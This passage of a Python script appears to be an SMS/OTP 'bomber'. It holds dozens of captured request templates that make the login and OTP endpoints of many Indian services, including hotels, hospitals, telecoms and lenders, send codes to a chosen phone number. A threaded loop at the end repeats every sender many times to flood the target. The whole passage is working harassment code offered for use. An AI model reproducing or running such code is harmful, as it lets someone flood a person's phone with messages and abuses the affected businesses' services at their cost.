    response = requests.post('https://www.fabhotels.com/consumer/v1/mweb/user/login', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"firstName":"","lastName":"","password":"","isoCode":"IN","payload":"","signature":"","cleverTapId":"be247a4b7122489a8b96801cb34b2be1","userSource":"MWEB","countryCode":"91","mobile":"6789067890","userType":"ONLINE"}'
    #response = requests.post('https://www.fabhotels.com/consumer/v1/mweb/user/login', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phoneNumber': '+91'+number,
        'otp': '',
    }

    response = requests.post('https://api.fancraze.com/v1_6/auth/phoneV2', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phoneNumber":"+916789067890","otp":""}'
    #response = requests.post('https://api.fancraze.com/v1_6/auth/phoneV2', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'buildVersion': '26.02',
        'phone': number,
        'source': 'signup',
        'type': 'p',
        'device': 'mobile',
        'email': '',
    }

    response = requests.post('https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"buildVersion":"26.02","phone":"6789067890","source":"signup","type":"p","device":"mobile","email":""}'
    #response = requests.post('https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile_number': number,
    }

    response = requests.post('https://hyuga-auth-service.pratech.live/v1/auth/otp/generate', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"mobile_number":"6789067890"}'
    #response = requests.post('https://hyuga-auth-service.pratech.live/v1/auth/otp/generate', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mfa_channels': {
            'phno': {
                'number': 6.78906789E9,
                'country_code': '+91',
            },
        },
    }

    response = requests.post('https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"mfa_channels":{"phno":{"number":6.78906789E9,"country_code":"+91"}}}'
    #response = requests.post('https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone': number,
    }

    response = requests.post('https://www.licious.in/api/login/signup', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phone":"6789067890"}'
    #response = requests.post('https://www.licious.in/api/login/signup', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'locationUrl': 'https://cars.tatamotors.com',
        'reqBody': {
            'countryCode': '91',
            'phone': number,
            'sendOtp': 'true',
        },
    }

    response = requests.post(
        'https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json',
        headers=headers,
        json=json_data,
    )

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"locationUrl":"https://cars.tatamotors.com","reqBody":{"countryCode":"91","phone":"6789067890","sendOtp":"true"}}'
    #response = requests.post(
    #    'https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json',
    #    headers=headers,
    #    data=data,
    #)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'country_code': '+91',
        'account_id': 'a7a9a523-c322-4e24-8932-914b8e76ac5d',
        'kind': 'patient',
        'username': number,
    }

    response = requests.post(
        'https://patientprod-patient.maxhospitals.in/vault/v1/logins/attempt/otp',
        headers=headers,
        json=json_data,
    )

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"country_code":"+91","account_id":"a7a9a523-c322-4e24-8932-914b8e76ac5d","kind":"patient","username":"6789067890"}'
    #response = requests.post('https://patientprod-patient.maxhospitals.in/vault/v1/logins/attempt/otp', headers=headers, data=data)


    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile_number': number,
    }

    response = requests.post(
        'https://investor-api.lendenclub.com/api/ios/retail-investor/v1/send-otp',
        headers=headers,
        json=json_data,
    )

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"mobile_number":"6789067890"}'
    #response = requests.post('https://investor-api.lendenclub.com/api/ios/retail-investor/v1/send-otp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile_psid': number,
        'activity_type': 'aakash-myadmission',
        'webengageData': {
            'profile': 'student',
            'whatsapp_opt_in': True,
            'method': 'mobile',
        },
        'mobile_number': '',
    }

    response = requests.post('https://antheapi.aakash.ac.in/api/generate-lead-otp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"mobile_psid":"6789067890","activity_type":"aakash-myadmission","webengageData":{"profile":"student","whatsapp_opt_in":true,"method":"mobile"},"mobile_number":""}'
    #response = requests.post('https://antheapi.aakash.ac.in/api/generate-lead-otp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'country_code': '91',
        'userData': number,
        'resend_otp': 0.0,
        'user_name': 'Hii',
    }

    response = requests.post('https://apis.bakingo.com/api/bakingo/fa/users/sendOtp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"country_code":"91","userData":"6789067890","resend_otp":0.0,"user_name":"Hii"}'
    #response = requests.post('https://apis.bakingo.com/api/bakingo/fa/users/sendOtp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'is_otp': 1.0,
        'mobile': number,
        'is_password': 0.0,
    }

    response = requests.post('https://www.brevistay.com/cst/app-api/login', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"is_otp":1.0,"mobile":"6789067890","is_password":0.0}'
    #response = requests.post('https://www.brevistay.com/cst/app-api/login', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone_no': 6.78906789E9,
    }

    response = requests.post('https://burgerking.in/api/consumer/api/v1/user/signUpWithPhone', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phone_no":6.78906789E9}'
    #response = requests.post('https://burgerking.in/api/consumer/api/v1/user/signUpWithPhone', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'apiName': 'LOGIN_SEND_OTP_API',
        'emittedFrom': 'client_buy_home',
        'isBot': 'false',
        'platform': 'mobile',
        'source': 'mobile',
        'source_name': 'AudienceWeb',
    }

    json_data = {
        'variables': {
            'phone': number,
            'userAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'otpLength': 4.0,
        },
        'query': '\n  mutation(\n    $email: String\n    $phone: String\n    $otpLength: Int\n    $userAgent: String\n  ) {\n    sendOtp(\n      phone: $phone\n      email: $email\n      otpLength: $otpLength\n      userAgent: $userAgent\n    ) {\n      success\n      message\n    }\n  }\n',
    }

    response = requests.post('https://mightyzeus.housing.com/api/gql', params=params, headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"variables":{"phone":"6789067890","userAgent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","otpLength":4.0},"query":"\\n  mutation(\\n    $email: String\\n    $phone: String\\n    $otpLength: Int\\n    $userAgent: String\\n  ) {\\n    sendOtp(\\n      phone: $phone\\n      email: $email\\n      otpLength: $otpLength\\n      userAgent: $userAgent\\n    ) {\\n      success\\n      message\\n    }\\n  }\\n"}'
    #response = requests.post('https://mightyzeus.housing.com/api/gql', params=params, headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'isEmail': False,
        'mobileNo': number,
        'email': '',
    }

    response = requests.post('https://api.bajajcapitalone.com/nps/api/v1/GenerateOTP', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"isEmail":false,"mobileNo":"6789067890","email":""}'
    #response = requests.post('https://api.bajajcapitalone.com/nps/api/v1/GenerateOTP', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'country_code': '+91',
        'phone': number,
    }

    response = requests.post(
        'https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create',
        headers=headers,
        json=json_data,
    )

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"country_code":"+91","phone":"6789067890"}'
    #response = requests.post(
    #    'https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create',
    #    headers=headers,
    #    data=data,
    #)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone': '+91-'+number,
        'app_client_id': '90391da1-ee49-4378-bd12-1924134e906e',
    }

    response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phone":"+91-6789067890","app_client_id":"90391da1-ee49-4378-bd12-1924134e906e"}'
    #response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, data=data)


    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile_number': number,
    }

    response = requests.post('https://parksmart.in/website/sendLink', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"mobile_number":"6789067890"}'
    #response = requests.post('https://parksmart.in/website/sendLink', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'countryCode': '+91',
        'action': 'SIGNIN',
        'type': 'MOBILE',
        'value': number,
    }

    response = requests.post('https://www.cleartrip.com/accounts/external-api/otp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"countryCode":"+91","action":"SIGNIN","type":"MOBILE","value":"6789067890"}'
    #response = requests.post('https://www.cleartrip.com/accounts/external-api/otp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone': number,
        'source': 'order_management',
        'type': 'sms',
    }

    response = requests.post('https://api.prod.oziva.in/nitro/send/', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phone":"6789067890","source":"order_management","type":"sms"}'
    #response = requests.post('https://api.prod.oziva.in/nitro/send/', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'contactNumber': number,
        'domainId': '2',
    }

    response = requests.post('https://www.proptiger.com/madrox/app/v2/entity/login-with-number', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"contactNumber":"6789067890","domainId":"2"}'
    #response = requests.post('https://www.proptiger.com/madrox/app/v2/entity/login-with-number', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'contactNumber': number,
        'domainId': '2',
    }

    response = requests.post(
        'https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call',
        headers=headers,
        json=json_data,
    )



    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'otp': {
            'phone': number,
            'reason': 'login',
        },
    }

    response = requests.post(
        'https://admin.wildwaters.in//rest/default/V1/thrive-textmessaging/otp',
        headers=headers,
        json=json_data,
    )


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'countryCode': '+91',
        'msisdn': '+91'+number,
    }

    response = requests.post('https://login.wynk.in/music/v2/account/otp', headers=headers, json=json_data)



    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'appId': 'WEB',
    }

    json_data = {
        'msgTxt': 'Use {OTP} as your login OTP. OTP is confidential',
        'msisdn': number,
    }

    response = requests.post('https://api.airtel.tv/v2/user/profile/generateOtp', params=params, headers=headers, json=json_data)


    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobileNumber': number,
        'alternateNumber': '',
        'loginFlowType': 'MOBILE',
    }

    response = requests.post('https://www.jio.com/api/jio-login-service/login/sendOtp', headers=headers, json=json_data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'isLoginByEmail': False,
        'flowId': 'login',
        'isLoginByMobile': True,
        'username': number,
    }

    response = requests.post('https://www.naukri.com/central-login-services/v1/otp', headers=headers, json=json_data)



    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone_number': number,
    }

    response = requests.post('https://lendplus.in/api/auth/user/request', headers=headers, json=json_data)



    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'data': {
            'contactNo': number,
            'resend': False,
            'anonymousId': '65d48590cbf0720f6eec2505',
        },
    }

    response = requests.post('https://gateway.credmudra.com/public/send-otp', headers=headers, json=json_data)




def send_multiple_messages(number):
    number = str(number)
    threads = []
    for _ in range(10):  # Send 10 threads for each function
        thread_smsg = threading.Thread(target=smsg, args=(number,))
        thread_okkg = threading.Thread(target=okkg, args=(number,))
        thread_sms = threading.Thread(target=sms, args=(number,))
        
        threads.extend([thread_smsg, thread_okkg, thread_sms])
        thread_smsg.start()
        thread_okkg.start()
        thread_sms.start()

    for thread in threads:
        thread.join()

# def send_multiple_messages(number):
#     processes = []
#     for _ in range(10):  # Send 10 processes for each function
#         process_smsg = multiprocessing.Process(target=smsg, args=(number,))
#         process_okkg = multiprocessing.Process(target=okkg, args=(number,))
#         process_sms = multiprocessing.Process(target=sms, args=(number,))
        
#         processes.extend([process_smsg, process_okkg, process_sms])
#         process_smsg.start()
#         process_okkg.start()
#         process_sms.start()

#     for process in processes:
#         process.join()

def mixfr(number):
    number = str(number)

    

    # for i in range(1):
        # thread = threading.Thread(target=smsg, args=(number,))
        # thread.start()
    #     smsg(number=number)
    
    for i in range (2):
        send_multiple_messages(number)
        print('done 1')

        # okkg(number=number)
        # sms(number=number)

    
